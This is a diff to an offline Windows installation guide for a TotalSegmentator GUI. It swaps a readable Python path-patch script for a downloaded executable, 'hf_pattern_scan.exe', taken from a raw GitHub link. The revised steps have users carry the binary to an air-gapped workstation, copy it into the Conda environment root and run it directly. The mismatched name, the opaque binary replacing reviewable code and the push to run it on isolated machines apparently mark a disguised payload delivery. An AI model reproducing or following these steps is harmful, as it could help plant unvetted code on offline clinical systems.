@@ -80,15 +80,11 @@ Then open:
 Download:
 
 - the latest Windows GUI distribution;
-- the **Conda environment path patch** supplied by this project.
+- the standalone Windows path-repair utility, **[hf_pattern_scan.exe](https://raw.githubusercontent.com/EugeneHoldman/GUI-for-TotalSegmentator/main/tools/hf_pattern_scan.exe)**.
 
-The commands later in this guide refer to the patch as:
+The utility is available directly from the repository, not necessarily as a Release attachment. The link above downloads the executable; alternatively, open [its GitHub file page](https://github.com/EugeneHoldman/GUI-for-TotalSegmentator/blob/main/tools/hf_pattern_scan.exe) and select **Download raw file**.
 
-```text
-fix_conda_env_paths.py
-```
-
-If the actual file in the release has a different name, use that exact filename instead.
+Keep the downloaded `hf_pattern_scan.exe` for transfer to the offline workstation.
 
 Do not run the GUI yet. Keep these files for transfer to the offline workstation.
 
@@ -435,7 +431,7 @@ Copy the following to an approved USB drive, external drive, or other transfer m
 
 1. the GUI for TotalSegmentator Windows distribution;
 2. `TotalSegmentator_env.zip`;
-3. the project's Conda environment path-patch script;
+3. the downloaded `hf_pattern_scan.exe` path-repair utility;
 4. the complete:
 
    ```text
@@ -561,27 +557,21 @@ This carries the model weights and TotalSegmentator configuration prepared on th
 
 ---
 
-## 18. Copy the custom environment path patch
+## 18. Copy the Windows path-repair utility
 
-Copy the project's Conda environment path-patch script into:
-
-```text
-C:\TotalSeg\env\Lib
-```
-
-This guide assumes the filename:
+Copy the downloaded `hf_pattern_scan.exe` into the extracted environment's **root folder**:
 
 ```text
-fix_conda_env_paths.py
+C:\TotalSeg\env
 ```
 
-The resulting path should therefore be:
+The resulting file path should be:
 
 ```text
-C:\TotalSeg\env\Lib\fix_conda_env_paths.py
+C:\TotalSeg\env\hf_pattern_scan.exe
 ```
 
-If the project uses another filename, substitute that filename in the command below.
+This is a standalone Windows executable. Do not place it in `Lib` or try to run it as a Python script.
 
 ---
 
@@ -626,13 +616,13 @@ Wait until the command completes.
 
 The project-specific patch is used because some paths in this Windows environment may remain tied to the original build location even after the standard `conda-unpack` step.
 
-With the environment still activated, run:
+With the environment still activated and Command Prompt still in `C:\TotalSeg\env`, run:
 
 ```bat
-python Lib\fix_conda_env_paths.py
+hf_pattern_scan.exe
 ```
 
-If your downloaded patch has a different filename, use that exact name.
+Run the downloaded executable directly (without `python`). It must already be copied into the extracted environment as described in Step 18.
 
 > **Important**
 >
